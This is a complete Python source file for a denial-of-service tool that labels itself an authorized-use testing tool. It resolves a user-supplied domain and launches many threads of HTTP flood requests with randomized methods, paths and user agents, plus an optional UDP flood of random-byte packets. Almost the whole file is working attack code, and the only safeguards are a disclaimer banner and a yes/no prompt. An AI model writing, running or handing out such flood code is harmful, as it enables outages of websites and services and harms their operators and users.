import socket
import threading
import time
import random
import requests
from urllib.parse import urlparse

# Global attack flag to control threads
attack_running = True

def resolve_domain(domain):
    """Resolve domain to IP, handling URLs with http/https."""
    try:
        if not domain.startswith(('http://', 'https://')):
            domain = 'http://' + domain
        
        parsed = urlparse(domain)
        domain = parsed.netloc or parsed.path.split('/')[0]
        
        ip = socket.gethostbyname(domain)
        return ip
    except Exception as e:
        print(f"[!] Error resolving domain: {e}")
        return None

def http_flood(target_ip, target_port=80, threads=100):
    """Advanced HTTP Flood Attack with Random Headers & Payloads."""
    print(f"[+] Starting HTTP Flood on {target_ip}:{target_port} with {threads} threads")
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
    ]
    
    def attack():
        global attack_running
        while attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                
                # Randomize HTTP requests
                method = random.choice(["GET", "POST", "HEAD"])
                path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
                headers = (
                    f"{method} {path} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: {random.choice(user_agents)}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(headers.encode())
                s.close()
            except Exception as e:
                print(f"[!] Error in HTTP attack: {e}")
                time.sleep(0.5)
    
    # Launch threads
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def udp_flood(target_ip, target_port=80, threads=50, packet_size=1024):
    """UDP Flood Attack (Use with Caution)."""
    print(f"[+] Starting UDP Flood on {target_ip}:{target_port} with {threads} threads")
    
    def attack():
        global attack_running
        while attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(packet_size), (target_ip, target_port))
                s.close()
            except Exception as e:
                print(f"[!] Error in UDP attack: {e}")
                time.sleep(0.5)
    
    # Launch threads
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def main():
    global attack_running
    
    print("\n🔥 Advanced DDoS Testing Tool (Authorized Use Only) 🔥")
    print("--------------------------------------------------")
    
    domain = input("[?] Enter target domain (e.g., example.com): ").strip()
    ip = resolve_domain(domain)
    
    if not ip:
        print("[!] Failed to resolve domain.")
        return
    
    print(f"[+] Resolved IP: {ip}")
    
    try:
        port = int(input("[?] Enter target port (default 80): ") or 80)
        http_threads = int(input("[?] Enter HTTP flood threads (default 100): ") or 100)
        udp_enabled = input("[?] Enable UDP flood? (y/n): ").lower() == 'y'
        
        if udp_enabled:
            udp_threads = int(input("[?] Enter UDP flood threads (default 50): ") or 50)
            udp_packet_size = int(input("[?] Enter UDP packet size (default 1024): ") or 1024)
    except ValueError:
        print("[!] Invalid input. Using defaults.")
        port, http_threads = 80, 100
    
    print("\n⚠️ WARNING: This will launch a heavy attack. Only proceed if authorized.")
    confirm = input("[?] Confirm attack? (y/n): ").lower()
    if confirm != 'y':
        print("[!] Aborted.")
        return
    
    print("\n[+] Attack started. Press Ctrl+C to stop.")
    
    # Start attacks
    http_flood(ip, port, http_threads)
    if udp_enabled:
        udp_flood(ip, port, udp_threads, udp_packet_size)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping attack...")
        attack_running = False
        time.sleep(2)  # Allow threads to exit

if __name__ == "__main__":
    main()